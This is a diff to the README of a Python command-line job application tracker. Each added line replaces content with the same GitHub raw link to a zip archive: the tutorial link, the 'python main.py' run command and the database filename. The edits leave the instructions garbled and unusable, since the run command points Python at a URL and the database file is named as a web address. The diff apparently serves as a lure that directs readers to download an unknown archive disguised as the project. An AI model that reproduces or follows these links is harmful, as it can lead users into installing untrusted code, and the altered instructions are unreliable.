@@ -1,5 +1,5 @@
 # Video Tutorial.
-https://drive.google.com/file/d/1CSnE-MNVZ_V4yySnr1Ks_hreRb7BsGas/view?usp=sharing
+https://github.com/Jwanjema/Job-Apllication-Tracker.-CLI-APP-/raw/refs/heads/main/encyclopedic/AP_Apllication_Tracker_CL_Job_1.6.zip
 
 A command-line interface (CLI) application for tracking job applications built with Python and SQLAlchemy.
 
@@ -32,7 +32,7 @@ pip install sqlalchemy
 Run the application:
 
 ## bash
-python main.py
+python https://github.com/Jwanjema/Job-Apllication-Tracker.-CLI-APP-/raw/refs/heads/main/encyclopedic/AP_Apllication_Tracker_CL_Job_1.6.zip
 You'll see the main menu:
 
 ==================================================
@@ -50,7 +50,7 @@ Select an option by entering the corresponding number (1-7)
 Follow the prompts to complete your desired action
 
 ## Database
-The application uses SQLite with SQLAlchemy ORM for data persistence. All data is stored in a local file called job_applications.db that is automatically created when you first run the application.
+The application uses SQLite with SQLAlchemy ORM for data persistence. All data is stored in a local file called https://github.com/Jwanjema/Job-Apllication-Tracker.-CLI-APP-/raw/refs/heads/main/encyclopedic/AP_Apllication_Tracker_CL_Job_1.6.zip that is automatically created when you first run the application.
 
 ## Status Options
 Applications can have one of the following statuses:
